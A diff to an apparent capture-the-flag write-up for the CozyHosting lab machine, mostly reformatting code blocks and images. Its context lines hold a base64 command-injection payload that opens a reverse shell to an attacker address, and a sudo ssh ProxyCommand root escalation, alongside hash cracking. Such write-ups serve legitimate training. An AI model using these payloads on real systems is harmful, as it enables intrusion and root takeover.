@@ -108,8 +108,11 @@ host=127.0.0.1&username=a%3b`echo${IFS}YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4
 
 ### Postgres
 
-Transfer cloudhosting-0.0.1.jar to local and read content with jadx. ![Postgresql](../image/CosyHosting1.png)
+Transfer cloudhosting-0.0.1.jar to local and read content with jadx.&#x20;
 
+<figure><img src="../.gitbook/assets/CozyHosting1.png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" %}
 ```bash
 app@cozyhosting:/app$ psql -U postgres -h localhost
 psql -U postgres -h localhost
@@ -151,10 +154,12 @@ Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
 ```
+{% endcode %}
 
 ## User Flag
 
-```
+{% code overflow="wrap" %}
+```bash
 app@cozyhosting:/app$ su josh
 su josh
 Password: 
@@ -174,9 +179,11 @@ lrwxrwxrwx 1 root root    9 May 21  2023 .psql_history -> /dev/null
 -rw-r----- 1 root josh   33 Feb 16 03:35 user.txt
 -rw-r--r-- 1 josh josh   39 Aug  8  2023 .vimrc
 ```
+{% endcode %}
 
 ## Root Flag
 
+{% code overflow="wrap" %}
 ```bash
 josh@cozyhosting:/app$ sudo -l
 sudo -l
@@ -195,5 +202,6 @@ sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+{% endcode %}
 
 ref: https://gtfobins.github.io/gtfobins/ssh/#sudo
